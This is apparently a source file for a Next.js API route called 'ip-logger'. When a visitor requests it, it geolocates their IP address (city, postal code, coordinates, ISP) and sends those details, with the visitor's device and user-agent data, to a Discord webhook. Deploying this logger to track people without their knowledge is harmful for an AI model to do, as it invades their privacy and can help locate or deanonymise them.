// /pages/api/ip-logger.js
// Vercel-compatible Next.js API route to log IP info using BigDataCloud (free-tier fields)

export default async function handler(req, res) {
  // -- CORS (adjust for production) --
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-Requested-With');

  if (req.method === 'OPTIONS') return res.status(200).end();

  try {
    // -------------------------
    // 1) Client IP & UA (Vercel-friendly)
    // -------------------------
    let clientIP =
      (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || req.socket?.remoteAddress || '')
        .toString();
    if (!clientIP) clientIP = '0.0.0.0';
    if (clientIP.includes(',')) clientIP = clientIP.split(',')[0].trim();
    clientIP = clientIP.replace(/^::ffff:/, '');

    const userAgent = (req.headers['user-agent'] || 'Unknown').toString();

    // -------------------------
    // 2) Validate API Key
    // -------------------------
    const BIGDATACLOUD_API_KEY = process.env.BIGDATACLOUD_API_KEY;
    if (!BIGDATACLOUD_API_KEY) {
      return res.status(500).json({ success: false, error: 'Missing BIGDATACLOUD_API_KEY env var' });
    }

    const BASE = 'https://api-bdc.net/data'; // BigDataCloud host used previously and works for free endpoints

    // -------------------------
    // 3) Fetch ip-geolocation-full (best-effort)
    // -------------------------
    let ipData = {};
    try {
      const geoUrl = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${BIGDATACLOUD_API_KEY}`;
      const geoResp = await fetch(geoUrl);
      const geoText = await geoResp.text();
      if (!geoResp.ok) {
        console.error('BigDataCloud geolocation error:', geoResp.status, geoText);
        // continue with empty ipData but report error later if needed
        throw new Error(`BigDataCloud geolocation failed: ${geoResp.status}`);
      }
      ipData = JSON.parse(geoText || '{}');
    } catch (e) {
      console.warn('Failed to fetch ip-geolocation-full:', e.message);
      // Continue: we'll still try timezone-by-ip later and return partial data
    }

    // -------------------------
    // 4) Determine bot/cloud/residential
    // -------------------------
    const isBot = /bot|crawler|spider|preview|screenshot|vercel|uptime|monitor/i.test(userAgent);
    const orgName = (
      ipData?.network?.organisation ||
      ipData?.organisation ||
      ipData?.asnOrganisation ||
      ipData?.network?.name ||
      (ipData?.asn && `AS${ipData.asn}`) ||
      'Unknown'
    );

    const isDatacenter = /vercel|digitalocean|amazon|google|cloudflare|azure|linode|ovh|hetzner|rackspace/i.test(
      String(orgName).toLowerCase()
    );

    // -------------------------
    // 5) Coordinates & timezone (try timezone-by-location then timezone-by-ip)
    // -------------------------
    const latitude = numberOrNull(ipData?.location?.latitude ?? ipData?.latitude);
    const longitude = numberOrNull(ipData?.location?.longitude ?? ipData?.longitude);

    let timezoneData = null;
    try {
      if (latitude != null && longitude != null) {
        const tzUrl = `${BASE}/timezone-by-location?latitude=${encodeURIComponent(latitude)}&longitude=${encodeURIComponent(longitude)}&localityLanguage=en&key=${BIGDATACLOUD_API_KEY}`;
        const tzResp = await fetch(tzUrl);
        if (tzResp.ok) timezoneData = await tzResp.json();
      }
    } catch (e) {
      console.warn('timezone-by-location failed:', e.message);
    }

    // fallback: timezone-by-ip
    if (!timezoneData) {
      try {
        const tzIpUrl = `${BASE}/timezone-by-ip?ip=${encodeURIComponent(clientIP)}&key=${BIGDATACLOUD_API_KEY}`;
        const tzIpResp = await fetch(tzIpUrl);
        if (tzIpResp.ok) timezoneData = await tzIpResp.json();
      } catch (e) {
        console.warn('timezone-by-ip failed:', e.message);
      }
    }

    // -------------------------
    // 6) Confidence & accuracyRadius handling
    // -------------------------
    // BigDataCloud may provide confidence, accuracyRadius, and/or confidenceArea (polygon)
    let confidence = ipData?.confidence ?? ipData?.location?.confidence ?? null;
    let accuracyRadius = ipData?.location?.accuracyRadius ?? ipData?.accuracyRadius ?? null;
    const confidenceArea = ipData?.confidenceArea ?? ipData?.location?.confidenceArea ?? null;

    // If accuracy radius missing but a confidence polygon exists, compute a conservative radius (km)
    if ((accuracyRadius == null || Number.isNaN(Number(accuracyRadius))) && confidenceArea) {
      try {
        accuracyRadius = computeRadiusFromPolygon(confidenceArea); // returns km number
      } catch (e) {
        console.warn('computeRadiusFromPolygon failed:', e.message);
      }
    }

    // For datacenter/cloud IPs we prefer to not report an accuracy radius that looks precise:
    if (isDatacenter) {
      // keep confidence but downgrade to 'low' if not explicitly high
      if (!confidence) confidence = 'low';
      // hide radius for cloud IPs (makes output clearer)
      accuracyRadius = null;
    }

    // Normalize confidence value to friendly string if exists
    if (typeof confidence === 'string') confidence = confidence.toLowerCase();

    // -------------------------
    // 7) Network & ASN best-effort extraction
    // -------------------------
    const network = {
      isp: ipData?.network?.carrier?.name || ipData?.isp || ipData?.network?.name || 'Unknown',
      organization: orgName || 'Unknown',
      asn: ipData?.network?.autonomousSystemNumber || ipData?.asn || (ipData?.asnNumeric ? `AS${ipData.asnNumeric}` : 'Unknown'),
      connectionType: ipData?.network?.connectionType || ipData?.connectionType || 'Unknown'
    };

    // -------------------------
    // 8) Build response with every free-tier field we can include
    // -------------------------
    const structuredData = {
      ip: clientIP || 'Unknown',
      timestamp: new Date().toISOString(),
      userAgent: userAgent,
      // Location fields (city, region/state, country, continent, postal code)
      location: {
        city: ipData?.location?.city ?? ipData?.city ?? 'Unknown',
        region: ipData?.location?.region ?? ipData?.principalSubdivision ?? ipData?.region ?? 'Unknown',
        country: ipData?.country?.name ?? ipData?.countryName ?? ipData?.country ?? 'Unknown',
        countryCode: ipData?.country?.isoAlpha2 ?? ipData?.countryCode ?? 'Unknown',
        continent: ipData?.continent?.name ?? ipData?.continent ?? 'Unknown',
        postalCode: ipData?.location?.postalCode ?? ipData?.postalCode ?? 'Unknown',
        latitude: latitude != null ? Number(latitude) : null,
        longitude: longitude != null ? Number(longitude) : null,
        accuracyRadius: accuracyRadius != null ? Number(accuracyRadius) : null, // km or null
        confidence: confidence ?? 'unknown',
        confidenceArea: confidenceArea ?? null
      },
      timezone: {
        name: timezoneData?.ianaTimeZone ?? timezoneData?.ianaTimeZoneName ?? timezoneData?.zoneName ?? 'Unknown',
        localTime: timezoneData?.localTime ?? new Date().toISOString(),
        gmtOffsetString: timezoneData?.gmtOffsetString ?? timezoneData?.utcOffset ?? '+00:00'
      },
      network,
      device: parseUserAgent(userAgent),
      metadata: {
        callingCode: ipData?.country?.callingCode ?? ipData?.callingCode ?? 'Unknown',
        currency: ipData?.country?.currency?.code ?? ipData?.currency?.code ?? 'Unknown',
        isEU: ipData?.country?.isEU ?? false,
        trafficType: isDatacenter ? 'cloud / proxy' : 'residential',
        isDatacenter,
        isBot,
        // include some diagnostic values only in non-production for debugging
        rawResponse: process.env.NODE_ENV === 'development' ? ipData : undefined
      }
    };

    // -------------------------
    // 9) Send optional Discord webhook (non-blocking)
    // -------------------------
    if (process.env.DISCORD_WEBHOOK_URL) {
      sendToDiscord(structuredData).catch(err => {
        console.warn('Discord webhook failed:', err.message);
      });
    }

    // -------------------------
    // 10) Return the JSON (includes coords and as many fields as free tier provides)
    // -------------------------
    return res.status(200).json({
      success: true,
      message: 'Complete IP data collected (best-effort, free-tier fields)',
      data: structuredData
    });
  } catch (err) {
    console.error('IP logger error:', err);
    return res.status(500).json({
      success: false,
      error: err.message ?? String(err)
    });
  }
}

/* -------------------------
   Helper utilities
   ------------------------- */

function numberOrNull(v) {
  if (v == null) return null;
  const n = Number(v);
  return Number.isFinite(n) ? n : null;
}

function parseUserAgent(uaString) {
  const ua = (uaString || '').toString();
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Desktop';

  if (/OPR|Opera/.test(ua)) browser = 'Opera';
  else if (/Edg\//.test(ua) || /Edge\//.test(ua)) browser = 'Edge';
  else if (/Chrome\//.test(ua) && !/Edg\//.test(ua) && !/OPR/.test(ua)) browser = 'Chrome';
  else if (/Firefox\//.test(ua)) browser = 'Firefox';
  else if (/Safari\//.test(ua) && !/Chrome\//.test(ua)) browser = 'Safari';
  else if (/Chromium\//.test(ua)) browser = 'Chromium';

  if (/\bWindows\b/i.test(ua)) os = 'Windows';
  else if (/\bMacintosh\b|\bMac OS\b/i.test(ua)) os = 'Mac OS';
  else if (/\bAndroid\b/i.test(ua)) os = 'Android';
  else if (/\b(iPhone|iPad|iPod)\b/i.test(ua)) os = 'iOS';
  else if (/\bLinux\b/i.test(ua)) os = 'Linux';

  if (/\bMobile\b/i.test(ua) || (/Android/i.test(ua) && /Mobile/i.test(ua))) device = 'Mobile';
  else if (/\bTablet\b/i.test(ua) || /iPad/i.test(ua)) device = 'Tablet';

  if (/bot|crawler|spider|preview|screenshot|vercel|uptime|monitor/i.test(ua)) {
    browser = 'Bot';
    os = 'Server';
    device = 'Bot';
  }

  return { browser, os, device, raw: ua.substring(0, 2000) };
}

/**
 * computeRadiusFromPolygon(confidenceArea)
 * Accepts many shapes commonly returned:
 * - Array of [lat, lon]
 * - Array of [lon, lat]
 * - Array of { latitude, longitude } or { lat, lon }
 * Returns estimated radius in kilometers (max distance from centroid to vertices).
 */
function computeRadiusFromPolygon(polygon) {
  if (!Array.isArray(polygon) || polygon.length === 0) throw new Error('Invalid polygon');

  // Normalize to [{lat, lon}, ...]
  const pts = polygon.map((p) => {
    if (Array.isArray(p) && p.length >= 2) {
      const a = Number(p[0]), b = Number(p[1]);
      // If first fits lat range, assume [lat, lon]
      if (!Number.isNaN(a) && Math.abs(a) <= 90 && Math.abs(b) <= 180) return { lat: a, lon: b };
      // otherwise assume reversed [lon, lat]
      return { lat: Number(p[1]), lon: Number(p[0]) };
    } else if (p && typeof p === 'object') {
      const lat = numberOrNull(p.latitude ?? p.lat ?? p[1]);
      const lon = numberOrNull(p.longitude ?? p.lon ?? p.lng ?? p[0]);
      if (lat == null || lon == null) throw new Error('Unrecognized polygon point');
      return { lat, lon };
    } else {
      throw new Error('Unrecognized polygon point format');
    }
  });

  // Centroid (arithmetic mean - OK for small areas)
  const centroid = pts.reduce((acc, pt) => {
    acc.lat += pt.lat;
    acc.lon += pt.lon;
    return acc;
  }, { lat: 0, lon: 0 });
  centroid.lat /= pts.length;
  centroid.lon /= pts.length;

  // Max haversine distance
  let maxKm = 0;
  for (const pt of pts) {
    const d = haversineKm(centroid.lat, centroid.lon, pt.lat, pt.lon);
    if (d > maxKm) maxKm = d;
  }
  return Number(maxKm.toFixed(2));
}

// Haversine distance in kilometers
function haversineKm(lat1, lon1, lat2, lon2) {
  const toRad = deg => (deg * Math.PI) / 180;
  const R = 6371;
  const dLat = toRad(lat2 - lat1);
  const dLon = toRad(lon2 - lon1);
  const a =
    Math.sin(dLat / 2) * Math.sin(dLat / 2) +
    Math.cos(toRad(lat1)) * Math.cos(toRad(lat2)) *
    Math.sin(dLon / 2) * Math.sin(dLon / 2);
  const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
  return R * c;
}

// Minimal Discord embed sender (optional)
async function sendToDiscord(data) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookURL) return;

  const embed = {
    embeds: [{
      title: '🌐 Visitor IP Logged',
      color: 3447003,
      timestamp: data.timestamp,
      fields: [
        { name: 'IP', value: `\`\`\`${data.ip}\`\`\``, inline: false },
        { name: 'Country / Region / City', value: `${data.location.country} / ${data.location.region} / ${data.location.city}`, inline: true },
        { name: 'Coords', value: `${data.location.latitude != null ? data.location.latitude : 'N/A'}, ${data.location.longitude != null ? data.location.longitude : 'N/A'}`, inline: true },
        { name: 'Accuracy', value: data.location.accuracyRadius ? `${data.location.accuracyRadius} km` : 'N/A', inline: true },
        { name: 'Confidence', value: (data.location.confidence || 'unknown').toString().toUpperCase(), inline: true },
        { name: 'Network', value: `${data.network.organization}\nISP: ${data.network.isp}\nASN: ${data.network.asn}`, inline: true },
        { name: 'Device', value: `${data.device.browser} / ${data.device.os} (${data.device.device})`, inline: true },
        { name: 'Traffic', value: data.metadata.trafficType, inline: true },
        { name: 'User Agent (truncated)', value: `\`\`\`${(data.userAgent || '').substring(0, 1000)}\`\`\``, inline: false }
      ],
      footer: { text: `BigDataCloud • ${data.location.continent}` }
    }]
  };

  await fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embed)
  });
         }
